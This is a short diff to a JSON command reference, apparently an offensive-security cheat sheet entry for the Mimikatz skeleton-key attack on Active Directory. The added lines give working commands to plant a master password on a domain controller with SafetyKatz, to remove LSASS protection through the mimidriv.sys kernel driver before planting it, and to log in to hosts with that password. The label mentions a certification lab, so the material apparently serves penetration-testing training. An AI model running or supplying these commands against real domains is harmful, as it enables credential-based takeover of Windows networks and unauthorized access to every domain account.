@@ -95,8 +95,16 @@
   },
   "variations": [
     {
+      "label": "SafetyKatz (CRTP lab tool)",
+      "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\""
+    },
+    {
+      "label": "LSASS PPL bypass via mimidriv.sys (kernel driver)",
+      "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-"
+    },
+    {
       "label": "Then auth with the master password 'mimikatz'",
-      "command": "# any DA account now accepts password: mimikatz  (dir \\\\<dc>\\C$ /user:Administrator mimikatz)"
+      "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
     }
   ]
 }
